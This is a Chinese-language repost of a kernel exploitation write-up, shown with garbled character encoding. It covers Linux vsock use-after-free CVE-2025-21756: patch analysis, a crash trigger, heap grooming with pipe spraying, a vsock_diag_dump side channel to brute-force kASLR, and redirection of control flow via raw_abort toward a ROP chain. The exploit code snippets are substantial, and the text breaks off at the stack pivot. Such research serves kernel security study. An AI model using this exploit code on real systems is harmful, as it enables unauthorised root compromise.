#  Linuxå†…æ ¸æ¼æ´åˆ©ç”¨CVE-2025-21756ï¼šVsock æ”»å‡»   
 Otså®‰å…¨   2025-05-24 08:50  
  
w  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
> æ–‡ç« è®²çš„æ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªæ¼æ´ï¼ŒCVE-2025-21756ï¼Œåå­—è¿˜æŒºé…·ï¼Œå«â€œAttack of the Vsockâ€ã€‚è¿™ä¸ªæ¼æ´å…¶å®æ˜¯ä¸ªUse-After-Freeé—®é¢˜ï¼Œå­˜åœ¨äºvsockå­ç³»ç»Ÿé‡Œï¼Œä¸»è¦æ˜¯å› ä¸ºå¼•ç”¨è®¡æ•°å¤„ç†å¾—ä¸å¥½ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½ç›´æ¥ææƒåˆ°rootï¼Œæ‹¿åˆ°ç³»ç»Ÿæ§åˆ¶æƒã€‚ä½œè€…åœ¨æ–‡ç« é‡Œè¯¦ç»†è®²äº†å’‹åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼ŒåŒ…æ‹¬æ€ä¹ˆç»•è¿‡AppArmorå’ŒkASLRï¼Œè¿˜ç”¨ROPé“¾æå®šäº†ä»£ç æ‰§è¡Œï¼Œæœ€ååœ¨Linux 6.6.75ä¸Šæ‹¿åˆ°äº†root shellã€‚è¯´å®è¯ï¼Œè¿™ç§æ¼æ´æŒºè®©äººå¤´ç–¼çš„ï¼ŒLinuxå†…æ ¸å®‰å…¨ä¸€ç›´æ˜¯ä¸ªè€å¤§éš¾é—®é¢˜ï¼Œç±»ä¼¼çš„UAFæ¼æ´ä¹‹å‰ä¹Ÿè§è¿‡ä¸å°‘ã€‚è¿™ç¯‡æ–‡ç« å†™å¾—æŒºå®åœ¨çš„ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥çœ‹çœ‹  
  
  
ä¸€å¼€å§‹åªæ˜¯éšæ„æµè§ˆKernelCTFæäº¤çš„å†…å®¹ï¼Œä½†å¾ˆå¿«å°±æ¼”å˜æˆé•¿è¾¾æ•°å‘¨çš„æ·±å…¥ç ”ç©¶ï¼Œç ”ç©¶ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„è¡¥ä¸ - ä»¥åŠæˆ‘ç¬¬ä¸€æ¬¡ä» Linux å†…æ ¸æ¼æ´ä¸­è·å¾— root shellï¼  
  
åœ¨æµè§ˆå…¬å¼€çš„æäº¤ç”µå­è¡¨æ ¼æ—¶ï¼Œæˆ‘çœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„æ¡ç›®ï¼šexp237ã€‚è¿™ä¸ªæ¼æ´è¡¥ä¸çœ‹èµ·æ¥éå¸¸ç®€å•ï¼Œæˆ‘æƒŠè®¶äºä¸€ä½ç ”ç©¶äººå‘˜ç«Ÿç„¶èƒ½å¤Ÿåˆ©ç”¨å®ƒè¿›è¡Œæƒé™æå‡ã€‚äºæ˜¯ï¼Œæˆ‘å¼€å§‹äº†ä¸€æ®µå¯èƒ½ä¼šé™ä½æˆ‘çš„GPAï¼Œç”šè‡³å¶å°”è®©æˆ‘æ€€ç–‘è‡ªå·±æ˜¯å¦ç†æ™ºçš„æ—…ç¨‹ï¼šæˆ‘çš„ç¬¬ä¸€ä¸ªLinuxå†…æ ¸æ¼æ´åˆ©ç”¨ï¼  
  
è®¾ç½®ç¯å¢ƒ  
  
åœ¨å¼€å§‹æ·±å…¥å¼€å‘æ¼æ´åˆ©ç”¨ç¨‹åºä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªè‰¯å¥½çš„ Linux å†…æ ¸è°ƒè¯•ç¯å¢ƒã€‚æˆ‘å†³å®šä½¿ç”¨QEMUï¼Œå¹¶ç»“åˆmidas çš„ç²¾å½©æ–‡ç« å’Œ bata çš„gdb å†…æ ¸æ‰©å±•è„šæœ¬ã€‚æˆ‘é€‰æ‹©ä» Linux å†…æ ¸ 6.6.75 å¼€å§‹ï¼Œå› ä¸ºå®ƒä¸å…¶ä»–ç ”ç©¶äººå‘˜æ­£åœ¨åˆ©ç”¨çš„ç‰ˆæœ¬æ¥è¿‘ã€‚å®é™…ä¸Šï¼Œæˆ‘åœ¨ WSL ä¸­å®Œæˆäº†æ•´ä¸ªé¡¹ç›®ï¼Œè¿™æ ·æˆ‘å°±å¯ä»¥åœ¨å­¦æ ¡çš„ Windows ç”µè„‘ä¸Šç¼–å†™æ¼æ´åˆ©ç”¨ç¨‹åºäº†ï¼  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadaUxE9eycrpH9MyyWrS4apryIicPsT9Pwaib8r1ACIRu4iaqe8BFzpLSeBolbOVnrImGy2Njg8M7FibA/640?wx_fmt=png&from=appmsg "")  
  
è¡¥ä¸åˆ†æ  
  
ä»ä¸‹é¢çš„è¡¥ä¸ä¸­å¯ä»¥çœ‹å‡ºï¼Œä¿®å¤ä»…æ¶‰åŠå‡ è¡Œä»£ç ã€‚ä»ä»£ç å’Œè¯´æ˜æ¥çœ‹ï¼Œä¼ è¾“é‡æ–°åˆ†é…å¯ä»¥è§¦å‘vsock_remove_sockï¼Œä»è€Œè°ƒç”¨ ï¼Œvsock_remove_boundä»è€Œé”™è¯¯åœ°å‡å°‘ vsock å¯¹è±¡ä¸Šçš„å¼•ç”¨è®¡æ•°å™¨ï¼ˆå¦‚æœå¥—æ¥å­—ä¸€å¼€å§‹å°±æœªç»‘å®šï¼‰ã€‚  
  
å½“å†…æ ¸ä¸­æŸä¸ªå¯¹è±¡çš„å¼•ç”¨è®¡æ•°å™¨è¾¾åˆ°é›¶æ—¶ï¼Œè¯¥å¯¹è±¡å°†è¢«é‡Šæ”¾åˆ°å…¶å„è‡ªçš„å†…å­˜ç®¡ç†å™¨ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œåœ¨é‡Šæ”¾ vsock å¯¹è±¡åï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿè§¦å‘æŸç§é‡Šæ”¾åä½¿ç”¨ (UAF) æ¼æ´ï¼Œä»¥è·å¾—æ›´å¥½çš„åŸå§‹æƒé™å¹¶æå‡æƒé™ã€‚  
  
```
--- a/net/vmw_vsock/af_vsock.c+++ b/net/vmw_vsock/af_vsock.c@@Â -337,7Â +337,10Â @@ EXPORT_SYMBOL_GPL(vsock_find_connected_socket);Â void vsock_remove_sock(struct vsock_sock *vsk)Â {- vsock_remove_bound(vsk);+Â /* Transport reassignment must not remove the binding. */+Â ifÂ (sock_flag(sk_vsock(vsk), SOCK_DEAD))+ vsock_remove_bound(vsk);+Â  Â vsock_remove_connected(vsk);Â }Â EXPORT_SYMBOL_GPL(vsock_remove_sock);@@Â -821,12Â +824,13Â @@Â staticÂ void __vsock_release(struct sock *sk, int level)Â  Â  */Â  Â lock_sock_nested(sk, level);+ sock_orphan(sk);+Â  Â ifÂ (vsk->transport)Â  Â  Â vsk->transport->release(vsk);Â  Â elseifÂ (sock_type_connectible(sk->sk_type))Â  Â  Â vsock_remove_sock(vsk);- sock_orphan(sk);Â  Â sk->sk_shutdown = SHUTDOWN_MASK;Â  Â skb_queue_purge(&sk->sk_receive_queue);
```  
  
  
é™¤äº†è¿™ä¸ªè¡¥ä¸ä¹‹å¤–ï¼Œç»´æŠ¤äººå‘˜è¿˜ä¸ºè¯¥æ¼æ´æ·»åŠ äº†ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œè¿™å¯¹äºå¯åŠ¨æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨ã€‚  
  
```
#defineÂ MAX_PORT_RETRIES 24Â /* net/vmw_vsock/af_vsock.c */#defineÂ VMADDR_CID_NONEXISTING 42/* Test attempts to trigger a transport release for an unbound socket. This canÂ * lead to a reference count mishandling.Â */staticvoidtest_seqpacket_transport_uaf_client(constÂ struct test_opts *opts){intÂ sockets[MAX_PORT_RETRIES];structsockaddr_vmaddr;intÂ s, i, alen;Â  s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);Â  alen =Â sizeof(addr);ifÂ (getsockname(s, (struct sockaddr *)&addr, &alen)) {Â  Â  perror("getsockname");Â  Â Â exit(EXIT_FAILURE);Â  }forÂ (i =Â 0; i < MAX_PORT_RETRIES; ++i)Â  Â  sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,Â  Â  Â  Â  Â  SOCK_SEQPACKET);Â  close(s);Â  s = socket(AF_VSOCK, SOCK_SEQPACKET,Â 0);ifÂ (s <Â 0) {Â  Â  perror("socket");Â  Â Â exit(EXIT_FAILURE);Â  }ifÂ (!connect(s, (struct sockaddr *)&addr, alen)) {Â  Â Â fprintf(stderr,Â "Unexpected connect() #1 success\n");Â  Â Â exit(EXIT_FAILURE);Â  }/* connect() #1 failed: transport set, sk in unbound list. */Â  addr.svm_cid = VMADDR_CID_NONEXISTING;ifÂ (!connect(s, (struct sockaddr *)&addr, alen)) {Â  Â Â fprintf(stderr,Â "Unexpected connect() #2 success\n");Â  Â Â exit(EXIT_FAILURE);Â  }/* connect() #2 failed: transport unset, sk ref dropped? */Â  addr.svm_cid = VMADDR_CID_LOCAL;Â  addr.svm_port = VMADDR_PORT_ANY;/* Vulnerable system may crash now. */Â  bind(s, (struct sockaddr *)&addr, alen);Â  close(s);whileÂ (i--)Â  Â  close(sockets[i]);Â  control_writeln("DONE");}
```  
  
  
æœ€åˆçš„æƒ³æ³•  
  
ç”±äºè¿™æ˜¯ä¸€ä¸ªUAFæ¼æ´ï¼Œæˆ‘æœ€åˆçš„æƒ³æ³•æ˜¯å°è¯•è·¨ç¼“å­˜æ”»å‡»ã€‚æˆ‘çš„å¤§è‡´è®¡åˆ’å¦‚ä¸‹â€¦â€¦  
1. è§¦å‘ vsock å¯¹è±¡çš„ä»»æ„é‡Šæ”¾  
  
1. ä½¿ç”¨ä¸€äº›ç”¨æˆ·æ§åˆ¶çš„å¯¹è±¡æ¥å›æ”¶é¡µé¢ï¼Œä¾‹å¦‚msg_msg  
  
1. ç ´å vsock å¯¹è±¡ä¸­çš„æŸäº›å‡½æ•°æŒ‡é’ˆä»¥è·å–ä»£ç æ‰§è¡Œ  
  
æˆ‘ä»¬é™·å…¥ææ…Œï¼  
  
åœ¨æˆ‘çš„è™šæ‹Ÿæœºä¸Šç¨å¾®ä¿®æ”¹å¹¶è¿è¡Œæµ‹è¯•ä»£ç ï¼ˆå‚è§crash.cï¼‰ï¼Œç»“æœç«Ÿç„¶å¯¼è‡´äº†å¦‚ä¸‹æ‰€ç¤ºçš„å†…æ ¸å´©æºƒï¼ç»è¿‡ä¸€ç•ªè°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç° vsock å¯¹è±¡è™½ç„¶è¢«é‡Šæ”¾äº†ï¼Œä½†å®é™…ä¸Šä»ç„¶é“¾æ¥åˆ°äº†vsock_bind_tableã€‚å¤ªæ£’äº†ï¼  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadaUxE9eycrpH9MyyWrS4ap35PYaLuD9yPLBGbvGpU9dibBBNo9cI97OlGKHKP4zlhHiaoxl6INpO9A/640?wx_fmt=png&from=appmsg "")  
  
å½“ AppArmor åœ¨å›æ”¶å¥—æ¥å­—ä¸Šæ‰§è¡Œ bind() è°ƒç”¨æœŸé—´å–æ¶ˆå¼•ç”¨ NULL sk_security æŒ‡é’ˆæ—¶ï¼Œå°±ä¼šå‘ç”Ÿææ…Œã€‚è¿™è¯å®äº† UAF çš„å­˜åœ¨ï¼Œå¹¶å‡¸æ˜¾äº† LSM é’©å­å¸¦æ¥çš„éšœç¢ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚  
  
éšœç¢ï¼ƒ1ï¼šAppArmor + LSM  
  
æˆ‘ä»¬é‡åˆ°çš„ç¬¬ä¸€ä¸ªä¸»è¦éšœç¢æ˜¯ AppArmorã€‚è¿™æ˜¯ä¸Šé¢è°ƒç”¨æ ˆä¸­çœ‹åˆ°çš„å†…æ ¸è°ƒç”¨security_socket_bindå’Œ çš„åœ°æ–¹aa_sk_permã€‚è¿™security_socket_*ä¸¤ä¸ªå‡½æ•°æ˜¯ Linux å®‰å…¨æ¨¡å— (LSM) é’©å­ï¼Œå®ƒä¼šè°ƒç”¨ AppArmorã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„å¥—æ¥å­—æ˜¯å¦‚ä½•é€šè¿‡ AppArmor å®‰å…¨æ£€æŸ¥çš„å‘¢ï¼Ÿ  
  
è°ƒæŸ¥é—®é¢˜ï¼Œæ˜¾ç„¶__sk_destructè°ƒç”¨sk_prot_freeï¼Œè€Œ è°ƒç”¨security_sk_freeã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬è§¦å‘æ¼æ´ä»¥å‡å°‘ refcnt å¹¶ä¸” vsock è¢«é‡Šæ”¾æ—¶ï¼Œsk->sk_securityæŒ‡é’ˆå°†è¢«æ¸…é›¶ã€‚  
  
```
/**Â * security_sk_free() - Free the sock's LSM blobÂ *Â @sk: sockÂ *Â * Deallocate security structure.Â */void security_sk_free(struct sock *sk){Â  call_void_hook(sk_free_security, sk);Â  kfree(sk->sk_security);Â  sk->sk_security =Â NULL;}
```  
  
ä½†æ˜¯å½“æˆ‘ä»¬è°ƒç”¨ æ—¶security_socket_bindï¼ŒAppArmor å‡½æ•°ä¼šå–æ¶ˆå¼•ç”¨è¿™ä¸ªsk->sk_securityç»“æ„ä½“ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œå‡ ä¹æ¯ä¸ªå¥—æ¥å­—å‡½æ•°ä¼¼ä¹éƒ½æœ‰ä¸€ä¸ª LSM å¯¹åº”å‡½æ•°ã€‚ç®€è€Œè¨€ä¹‹ï¼šå†…æ ¸èµ‹äºˆæˆ‘ä»¬ä¸€ä¸ªæŒ‡å‘å¥—æ¥å­—çš„æ‚¬ç©ºæŒ‡é’ˆâ€”â€”ä½† AppArmor ç¡®ä¿æˆ‘ä»¬åœ¨ä½¿ç”¨å®ƒåšä»»ä½•æœ‰ç”¨çš„äº‹æƒ…ä¹‹å‰å°±å´©æºƒäº†ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ç”šè‡³æ— æ³•ç”¨å›æ”¶çš„å¥—æ¥å­—è°ƒç”¨ä»»ä½•æœ‰ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬åˆè¯¥å¦‚ä½•è¿›è¡Œ UAF æ”»å‡»å‘¢ï¼Ÿ  
  
```
gef>Â p security_socket_*security_socket_accept security_socket_getpeernameÂ security_socket_bind security_socket_getpeersec_dgramÂ security_socket_connect security_socket_getpeersec_streamÂ security_socket_create security_socket_getsocknameÂ security_socket_getsockopt security_socket_sendmsgsecurity_socket_listen security_socket_setsockoptsecurity_socket_post_create security_socket_shutdownsecurity_socket_recvmsg security_socket_socketpair
```  
  
  
æˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸»è¦é€‰æ‹©ã€‚  
1. ä¼ªé€ æŒ‡å‘è™šå‡å¯¹è±¡çš„ sk_security æŒ‡é’ˆ  
  
1. æ‰¾åˆ°ä¸€äº›ä¸å— apparmor ä¿æŠ¤çš„å‡½æ•°  
  
æˆ‘å†³å®šé¦–å…ˆæ¢ç´¢é€‰é¡¹#2ã€‚  
  
æˆ‘é¦–å…ˆå…³æ³¨çš„æ˜¯æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥æ³„éœ²ä¸€äº›åœ°å€ã€‚ä¸€äº›â€œæ˜¾è€Œæ˜“è§â€çš„é€‰æ‹©æ˜¯åƒgetsockoptæˆ– è¿™æ ·çš„å‡½æ•°getsocknameï¼Œä½†è¿™äº›å‡½æ•°éƒ½å—åˆ° apparmor çš„ä¿æŠ¤ã€‚æµè§ˆæºä»£ç æ—¶ï¼Œæˆ‘å¶ç„¶å‘ç°äº†è¿™ä¸ªvsock_diag_dumpåŠŸèƒ½ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰è¶£çš„å‡½æ•°ï¼Œå› ä¸ºå®ƒä¸å— apparmor çš„ä¿æŠ¤ã€‚ä»£ç å¦‚ä¸‹æ‰€ç¤ºã€‚  
  
```
staticintvsock_diag_dump(struct sk_buff *skb, struct netlink_callback *cb){// ... snip .../* Bind table (locally created sockets) */ifÂ (table ==Â 0) {Â  Â Â whileÂ (bucket < ARRAY_SIZE(vsock_bind_table)) {Â  Â  Â Â structlist_headÂ *headÂ = &vsock_bind_table[bucket];Â  Â  Â  i =Â 0;Â  Â  Â  list_for_each_entry(vsk, head, bound_table) {Â  Â  Â  Â Â structsockÂ *skÂ =Â sk_vsock(vsk);Â  Â  Â  Â Â ifÂ (!net_eq(sock_net(sk), net))Â  Â  Â  Â  Â Â continue;Â  Â  Â  Â Â ifÂ (i < last_i)Â  Â  Â  Â  Â Â gotoÂ next_bind;Â  Â  Â  Â Â ifÂ (!(req->vdiag_states & (1Â << sk->sk_state)))Â  Â  Â  Â  Â Â gotoÂ next_bind;Â  Â  Â  Â Â ifÂ (sk_diag_fill(sk, skb,Â  Â  Â  Â  Â  Â  Â NETLINK_CB(cb->skb).portid,Â  Â  Â  Â  Â  Â  Â cb->nlh->nlmsg_seq,Â  Â  Â  Â  Â  Â  Â NLM_F_MULTI) <Â 0)Â  Â  Â  Â  Â Â gotoÂ done;next_bind:Â  Â  Â  Â  i++;Â  Â  Â  }Â  Â  Â  last_i =Â 0;Â  Â  Â  bucket++;Â  Â  }Â  Â  table++;Â  Â  bucket =Â 0;Â  }// ... snip ...}
```  
  
  
ç”±äºæˆ‘ä»¬é‡Šæ”¾çš„å¥—æ¥å­—ä»ç„¶åœ¨ç»‘å®šè¡¨ä¸­ï¼Œå› æ­¤åªæœ‰ä¸¤é¡¹æ£€æŸ¥å¯ä»¥é˜²æ­¢æˆ‘ä»¬ä»å¥—æ¥å­—ä¸­è½¬å‚¨ä»»ä½•ä¿¡æ¯ã€‚å‰ä¸€é¡¹sk->sk_stateæ£€æŸ¥å¾ˆå®¹æ˜“é€šè¿‡ï¼ˆä¸éœ€è¦ä»»ä½•æ³„æ¼ï¼‰ï¼Œä½†åä¸€é¡¹sk_netæ£€æŸ¥ä¼¼ä¹æ›´éš¾ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½ä¼ªé€ ä¸€ä¸ªsk->__sk_common->skc_netæŒ‡é’ˆè€Œä¸å‘ç”Ÿ kASLR æ³„æ¼ï¼Ÿæˆ‘åœ¨è¿™æ–¹é¢è¢«å›°äº†å¤§çº¦ä¸€å‘¨ï¼Œä½†å¤šäºäº† discord ç¤¾åŒºçš„å¸®åŠ©ï¼Œæˆ‘æ‰å¾—ä»¥å…‹æœè¿™ä¸ªéš¾é¢˜ï¼  
  
Diag Dump Sidechannel çš„ä¹è¶£ä¸æ”¶ç›Š  
  
é™·å…¥å›°å¢ƒåï¼Œæˆ‘æ±‚åŠ©äº kernelctf ç¤¾åŒºï¼Œå¹¶åœ¨ discord ä¸Šåˆ†äº«äº†ä¸Šè¿°æ£€æŸ¥æ–¹æ³•ã€‚å‡ ä¹ç«‹åˆ»ï¼Œ@h0mbre å°±å›å¤äº†æˆ‘ï¼Œå»ºè®®æš´åŠ›ç ´è§£skc_netæŒ‡é’ˆï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åˆ©ç”¨vsock_diag_dumpä¾§ä¿¡é“æ”»å‡»ï¼å¤ªæ£’äº†ğŸ¤¯ï¼  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadaUxE9eycrpH9MyyWrS4apU2vuSs2BurmceZqT8HYHiaS2dVpuWLh9AgniazyicpQr5P16PrwSC53tQ/640?wx_fmt=png&from=appmsg "")  
  
æ‰€ä»¥æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬åšä»¥ä¸‹äº‹æƒ…æ¥æ³„æ¼init_net...  
1. å–·æ°´ç®¡é“å›æ”¶ UAF æ’åº§çš„é¡µé¢  
  
1. ä½¿ç”¨å—æ§å€¼é€ä¸ª QWORD åœ°å¡«å……æ¯ä¸ªç®¡é“ç¼“å†²åŒº  
  
1. ä½¿ç”¨ vsock_diag_dump() ä½œä¸ºä¾§é€šé“æ¥æ£€æµ‹æˆ‘ä»¬è¦†ç›–çš„ç»“æ„æ˜¯å¦â€œè¶³å¤Ÿæœ‰æ•ˆâ€ä»¥ç»•è¿‡è¿‡æ»¤  
  
1. ä¸€æ—¦ vsock_diag_dump() åœæ­¢æŠ¥å‘Šæˆ‘ä»¬çš„å¥—æ¥å­—ï¼Œæˆ‘ä»¬å°±çŸ¥é“æˆ‘ä»¬æŸåäº† skc_net  
  
1. ç„¶åï¼Œæˆ‘ä»¬å¼ºåˆ¶æ‰§è¡Œ init_net çš„ä½ä½ï¼Œç›´åˆ°å¥—æ¥å­—å†æ¬¡è¢«æ¥å— - ä»è€Œå®ç°å®Œå…¨çš„ kASLR ç»•è¿‡  
  
@h0mbre å»ºè®®ä½¿ç”¨ç®¡é“æ”¯æŒé¡µé¢ï¼Œäº‹å®è¯æ˜å®ƒæ¯”msg_msgæˆ‘ä¹‹å‰ä½¿ç”¨çš„å¯¹è±¡æ›´åŠ ç¨³å®š/æ˜“ç”¨ã€‚ç»è¿‡ä¸€ç•ªåŠªåŠ›ï¼Œæˆ‘æˆåŠŸåœ°ç¼–å†™äº†ä»¥ä¸‹ä»£ç æ¥æ³„æ¼sk_netæŒ‡é’ˆã€‚  
  
```
intÂ junk[FLUSH];forÂ (intÂ i =Â 0; i < FLUSH; i++)Â  Â  junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET,Â 0);puts("[+] pre alloc sockets");intÂ pre[PRE];forÂ (intÂ i =Â 0; i < PRE; i++)Â  Â  pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET,Â 0);// ... snip ... (alloc target & trigger uaf)puts("[+] fill up the cpu partial list");forÂ (intÂ i =Â 4; i < FLUSH; i += OBJS_PER_SLAB)Â  Â Â close(junk[i]);puts("[+] free all the pre/post alloc-ed objects");forÂ (intÂ i =Â 0; i < POST; i++)Â  Â Â close(post[i]);forÂ (intÂ i =Â 0; i < PRE; i++)Â  Â Â close(pre[i]);
```  
  
å¯¹è±¡çš„é¢„åˆ†é…å’Œååˆ†é…ç¡®ä¿æ•´ä¸ªé¡µé¢å®é™…ä¸Šè¢«è¿”å›ç»™ä¼™ä¼´åˆ†é…å™¨ï¼ˆå‚è§æ­¤æ–‡ï¼‰ã€‚ä¸‹é¢æ˜¯å®é™…æŸ¥æ‰¾æŒ‡é’ˆçš„ä»£ç skc_netã€‚  
  
```
intÂ pipes[NUM_PIPES][2];charÂ page[PAGE_SIZE];memset(page,Â 2, PAGE_SIZE);Â // skc_state must be 2puts("[+] reclaim page");intÂ w =Â 0;intÂ j;i =Â 0;whileÂ (i < NUM_PIPES) {Â  Â  sleep(0.1);Â  Â Â ifÂ (pipe(&pipes[i][0]) <Â 0) {Â  Â  Â  Â  perror("pipe");Â  Â  Â  Â Â break;Â  Â  }Â  Â Â printf(".");Â  Â  fflush(stdout);Â  Â  w =Â 0;Â  Â Â whileÂ (w < PAGE_SIZE) {Â  Â  Â  Â Â ssize_tÂ written = write(pipes[i][1], page,Â 8);Â  Â  Â  Â  j = query_vsock_diag();Â  Â  Â  Â  w += written;Â  Â  Â  Â Â ifÂ (j !=Â 48)Â gotoÂ out;Â  Â  }Â  Â  i++;Â  Â Â ifÂ (i %Â 32Â ==Â 0)Â puts("");}
```  
  
  
å¦‚ä½ æ‰€è§ï¼Œè¿™æ®µä»£ç åªæ˜¯ä¸æ–­åˆ›å»ºæ–°çš„ç®¡é“ï¼Œå¹¶ä¸€æ¬¡å¡«å……ä¸€ä¸ª QWORDï¼ˆ0x0202020202020202 ä»¥æ»¡è¶³skc_stateï¼‰ï¼Œç›´åˆ°vsock_diag_dumpä¸å†æ‰¾åˆ°ç›®æ ‡å¥—æ¥å­—ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å·²ç»è¦†ç›–äº†skc_netã€‚ä¸€æ—¦æˆ‘ä»¬çœŸæ­£è¦†ç›–äº†æŒ‡é’ˆï¼Œæˆ‘ä»¬åªéœ€è¦ä»¥ç›¸åŒçš„æ–¹å¼æš´åŠ›ç ´è§£åœ°å€çš„ä½ 32 ä½å³å¯ã€‚  
  
```
longÂ base =Â 0xffffffff84bb0000;Â // determined through experimentationlongÂ off =Â 0;longÂ addy;printf("[+] attempting net overwrite (aslr bypass).\n");whileÂ (off <Â 0xffffffff) {Â  Â  close(pipes[i][0]);Â  Â  close(pipes[i][1]);Â  Â Â ifÂ (pipe(&pipes[i][0]) <Â 0) {Â  Â  Â  Â  perror("pipe");Â  Â  }Â  Â  addy = base + off;Â  Â  write(pipes[i][1], page, w -Â 8);Â  Â  write(pipes[i][1], &addy,Â 8);Â  Â Â ifÂ (off %Â 256Â ==Â 0) {Â  Â  Â  Â Â printf("+");Â  Â  Â  Â  fflush(stdout);Â  Â  }Â  Â  j = query_vsock_diag();Â  Â Â ifÂ (j ==Â 48) {Â  Â  Â  Â Â printf("\n[*] LEAK init_net @ 0x%lx\n", base + off);Â  Â  Â  Â Â gotoÂ out2;Â  Â  }Â  Â  off +=Â 128;}
```  
  
  
é€šè¿‡skc_netè¦†ç›–ï¼Œæˆ‘ä»¬ä¸€ä¸¾ä¸¤å¾—ã€‚æˆ‘ä»¬ç»•è¿‡äº† kASLRï¼Œå¹¶æ‰¾åˆ°äº† vsock å¯¹è±¡ä¸­å·²çŸ¥çš„åç§»é‡ã€‚  
  
ç°åœ¨å‰©ä¸‹çš„å°±æ˜¯æ‰¾åˆ°ä¸€ç§å¯é çš„æ–¹æ³•æ¥é‡å®šå‘æ‰§è¡Œæµ......  
  
æ§åˆ¶ RIP  
  
ä¸ºäº†æ§åˆ¶æŒ‡ä»¤æŒ‡é’ˆï¼Œæˆ‘é‡‡ç”¨äº†è¯¥vsock_releaseå‡½æ•°ï¼Œå› ä¸ºå®ƒæ˜¯å°‘æ•°ä¸å— apparmor ä¿æŠ¤çš„ vsock åŠŸèƒ½ä¹‹ä¸€ã€‚  
  
```
staticÂ int vsock_release(struct socket *sock){Â  struct sock *sk = sock->sk;ifÂ (!sk)Â  Â Â return0;Â  sk->sk_prot->close(sk,Â 0);Â  __vsock_release(sk,Â 0);Â  sock->sk =Â NULL;Â  sock->state = SS_FREE;return0;}
```  
  
  
æˆ‘ä»¬æœ€æ„Ÿå…´è¶£çš„æ˜¯å¯¹ çš„è°ƒç”¨sk->sk_prot->close(sk, 0)ã€‚ç”±äºæˆ‘ä»¬æ§åˆ¶ skï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡å‘å‡½æ•° çš„æœ‰æ•ˆæŒ‡é’ˆã€‚è¿™è®©æˆ‘å›°æƒ‘äº†ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°æˆ‘å¼€å§‹è€ƒè™‘ä½¿ç”¨å…¶ä»–æœ‰æ•ˆçš„åŸå‹å¯¹è±¡ã€‚æˆ‘å‘ç°raw_protoæœ‰ä¸€ä¸ªæŒ‡å‘å¦‚ä¸‹æ‰€ç¤ºçš„ä¸­æ­¢å‡½æ•°çš„æŒ‡é’ˆã€‚  
  
```
intÂ raw_abort(structÂ sock *sk,Â intÂ err){Â  lock_sock(sk);Â  sk->sk_err = err;Â  sk_error_report(sk);Â  __udp_disconnect(sk,Â 0);Â  release_sock(sk);Â Â returnÂ 0;}
```  
  
  
è¯¥å‡½æ•°è°ƒç”¨ into sk_error_reportï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚  
  
```
voidÂ sk_error_report(structÂ sock *sk){Â  sk->sk_error_report(sk);switchÂ (sk->sk_family) {caseÂ AF_INET:Â  Â  fallthrough;caseÂ AF_INET6:Â  Â  trace_inet_sk_error_report(sk);Â  Â Â break;default:Â  Â Â break;Â  }}
```  
  
  
å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥sk->sk_error_reportä½¿ç”¨å †æ ˆæ¢è½´å°å·¥å…·è¦†ç›–å¥—æ¥å­—çš„å­—æ®µï¼Œæˆ‘ä»¬å°±åº”è¯¥èƒ½å¤Ÿè·³è½¬åˆ°ä»å¥—æ¥å­—åº•éƒ¨å¼€å§‹çš„ ROP é“¾ã€‚  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tadaUxE9eycrpH9MyyWrS4apHaKicFnJBia98Q7Qn8bGQtUD7JF5vbCndu8iaVczVyvmqEyKwsU8MY0lQ/640?wx_fmt=jpeg&from=appmsg "")  
  
ä¸‹é¢æ˜¯è¦†ç›–ä¹‹å vsock çŠ¶æ€çš„æ¸…æ™°å¯è§†åŒ–ã€‚  
  
```
sk->sk_prot --> &raw_protoÂ  Â  Â  Â  Â  Â  Â  â†³ .close = raw_abortÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â†³ sk->sk_error_report(sk) â†’ *stackivot*
```  
  
  
